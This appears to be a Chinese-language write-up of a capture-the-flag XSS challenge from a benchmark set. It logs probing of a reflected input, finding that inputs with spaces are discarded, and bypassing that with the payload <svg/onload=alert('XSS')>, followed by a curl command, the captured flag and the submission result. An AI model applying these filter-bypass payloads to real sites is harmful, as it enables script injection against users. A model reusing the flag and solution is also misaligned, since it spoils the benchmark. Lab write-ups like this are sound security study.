# xben-016-24 · 探索记录

对应题解：[`xben-016-24.md`](./xben-016-24.md)

## 目标与起点

容器 `10.0.173.136:5000`，`Werkzeug/1.0.1 Python/2.7.18`。

`GET /` → `Dalgona Challenges`，入口 `Page`。
`GET /page` 标题 `Dalgona - Triangle`，表单是 GET、字段 `name`，
反射在文本节点（紧跟模板的 `>`）：

```html
<input type=text name=name placeholder="Enter your name..." > INPUT>
```

## 第一阶段：探针

用 `Q…Q` 包裹法，再看反射：

| 片段 | 反射 |
| --- | --- |
| `QabcQ` | ` QabcQ>` |
| `Q<Q` / `Q>Q` | 原样 |
| `Q<svgQ` | 原样 |
| `QalertQ` / `QonloadQ` | 原样 |
| `Q"XSS"Q` | 原样 |
| **`Qa bQ`** | **`>`（输入消失）** |

单个词、尖括号、引号全部放行；**只有含空格的输入消失**。

## 第二阶段：确认空白规则

| 输入 | 反射 |
| --- | --- |
| `ab` | `ab` |
| `a b` | （空） |
| `a  b` | （空） |
| `Qa bQ` | （空） |

结论：**输入里只要出现空格，整条输入被丢弃**（不是删空格、也不是转义）。

## 第三阶段：直接打

因为空白被禁，含空格的标签写法（`<input autofocus onfocus=…>`）必然失败；
而 `<svg/onload=…>` 天然不含空格：

| payload | 结果 |
| --- | --- |
| `<svg/onload=alert("XSS")` | **Congratulations** |
| `<svg/onload=alert("XSS")>` | **Congratulations** |
| `<input autofocus onfocus=alert("XSS")>` | 失败（含空格 → 整段丢弃） |
| `<img/src=x/onerror=alert("XSS")` | 失败（未闭合 `img` 挂不上事件） |

注意带不带 `>` 都能过，说明**这关根本没有标签过滤**。

## 第四阶段：拿 flag

```bash
curl --get --data-urlencode 'name=<svg/onload=alert("XSS")' http://$T/page
```

```html
Congratulations!<p> Here is the flag: flag{30f58005-8332-4823-a7c2-00cbefe58e67}
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `<input autofocus onfocus=alert("XSS")>` | 输入整段消失 | 含空格 |
| `<img src=x onerror=alert(...)>` | 同上 | 含空格 |
| `<img/src=x/onerror=alert("XSS")` | 未触发 | 未闭合 `img` 无法绑定 `onerror` |
| 误以为"删空白"而试图用 `+` 代替空格 | 多余 | 本关是丢弃整段，不是删除后继续 |

## 这次真正的收获

1. **一个字符的差异就能定性。** `ab` 通过、`a b` 消失，只差一个空格，
   立刻锁定"空白是触发词"。这比逐个试字符集快得多。
2. **"整段丢弃"这个行为在族内出现过两次，但触发条件不同**
   （013 是 `alert`/`confirm` 词，本题是空白类字符）。所以判据要记成
   "输入消失 ⇒ 命中某黑名单"，而不是"输入消失 ⇒ 被 alert 关键词拦"。
3. **不过滤标签的关卡反而最省事。** `<svg/onload=…>` 无空格、无闭合要求，
   一次成功；带不带 `>` 都行，说明没有 `<[^>]+>` 之类的正则。
4. **同族规则差异极大，必须逐关探测。** 已解的五关 XSS 规则分别是：
   拦 `script/onerror/onload`（004/008）、拦全部字母数字（010）、
   删 `<[^>]+>`（011/015）、删 `<[A-Za-z/]`+引号 XSS（012）、
   拦 `alert/confirm`（013）、拦空白（016）。**任何"上一关能过"的结论都不能直接搬。**
